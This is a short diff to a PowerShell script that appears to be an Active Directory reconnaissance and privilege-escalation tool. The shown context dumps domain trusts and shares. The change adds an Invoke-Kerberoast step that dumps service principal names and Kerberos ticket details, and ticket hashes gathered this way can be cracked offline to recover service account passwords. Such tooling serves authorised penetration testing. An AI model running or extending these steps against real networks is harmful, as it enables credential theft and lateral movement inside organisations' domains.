@@ -74,6 +74,8 @@ Write-Host "[*] Dump Domain Trusts\n"
 Invoke-MapDomainTrust
 Write-Host "[*] Dump Domain Shares\n"
 Invoke-ShareFinder
+Write-Host "[*] Dump SPN and Kerberos Tickets details\n"
+Invoke-Kerberoast | fl
 
 ## Privesc Checks
 Write-Host "\n[*] Privesc Checks\n"
